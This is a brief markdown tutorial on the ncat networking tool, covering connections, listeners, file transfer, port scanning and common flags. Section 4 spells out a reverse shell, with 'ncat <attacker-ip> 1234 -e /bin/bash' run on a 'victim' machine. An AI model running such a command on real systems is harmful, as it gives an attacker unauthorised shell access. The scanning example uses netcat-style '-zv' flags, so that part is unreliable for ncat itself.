# ncat
is a tool which reads and writes data across network connections, using TCP or UDP protocol.  
it is designed to be a reliable back-end tool for **sending, receiving, ** and **redirecting **data across networks. It supports both TCP and UDP protocols, SSL encryption, and IPv6.

- can be used in wide range of functions such as

> transfer files  
> port scanning  
> creating reverse shells  
> setting up proxies - intermediary servers used to route network traffic, enhancing anonymity and potentially bypassing restrictions  
> debugging network services

### syntax
- ncat -option- -ip- -port-

## 1.connecting to remort server

        ncat 192.168.56.102 9999
trying to connect to machine (192.168.56.102) on port 9999

### 2. Listen for Incoming Connections
To set up Ncat as a listener on a specific port:

    ncat -l 1234
This will make Ncat listen on port 1234. You can connect to it from another machine using:

    ncat <listener-ip> 1234
    
### 3. Transfer Files
You can use Ncat to transfer files between two machines.

On the receiving machine

    ncat -l 1234 > received_file.txt
    
- On the sending machine:
  
      ncat <receiver-ip> 1234 < file_to_send.txt
### 4. Create a Reverse Shell
Ncat can be used to create a reverse shell, which is useful for remote administration or penetration testing.

- On the attacker's machine (listener):

      ncat -l 1234
- On the victim's machine:

      ncat <attacker-ip> 1234 -e /bin/bash
This will give the attacker a shell on the victim's machine.

### 5. Port Scanning
Ncat can also be used for basic port scanning:

    ncat -zv example.com 1-100
This will scan ports 1 to 100 on example.com and report which ones are open.

## Common Options
Here are some commonly used options with Ncat:

>-l	Listen mode (wait for incoming connections).  
>-p	Specify a port number.  
>-v	Verbose output (use -vv for more verbosity).  
>-e	Execute a command (e.g., /bin/bash for a shell).  
>-w	Set a timeout for connections.  
>-u	Use UDP instead of TCP.Option	Description  
>--ssl	Use SSL encryption.  
>-k	Keep listening after a client disconnects.  

